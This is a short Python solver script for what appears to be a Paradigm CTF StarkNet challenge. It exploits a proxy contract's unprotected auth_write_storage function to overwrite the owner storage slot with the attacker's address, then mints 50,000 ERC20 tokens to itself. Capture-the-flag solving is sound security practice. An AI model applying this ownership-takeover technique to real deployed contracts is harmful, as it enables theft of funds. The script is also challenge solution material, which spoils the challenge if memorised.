from paradigmctf.cairo_challenge import *

from starknet_py.net import AccountClient
from starknet_py.contract import Contract

from starkware.starknet.public.abi import get_storage_var_address
from starkware.starknet.core.os.contract_address.contract_address import calculate_contract_address_from_hash

async def solver(client: AccountClient, proxy_contract: Contract):
    erc20_class_hash = await client.get_storage_at(proxy_contract.address, get_storage_var_address("implementation"), "latest")
    erc20_address = calculate_contract_address_from_hash(
        salt=111111,
        class_hash=erc20_class_hash,
        constructor_calldata=[],
        deployer_address=0,
    )

    erc20_contract = await Contract.from_address(erc20_address, client)

    wrapper_contract = Contract(
        proxy_contract.address,
        erc20_contract.data.abi,
        client,
    )

    result = await proxy_contract.functions["auth_write_storage"].invoke(client.address, get_storage_var_address("owner"), client.address, max_fee=int(1e16))
    await result.wait_for_acceptance()

    result = await wrapper_contract.functions["mint"].invoke(client.address, int(50000e18), max_fee=int(1e16))
    await result.wait_for_acceptance()

run_solver(solver)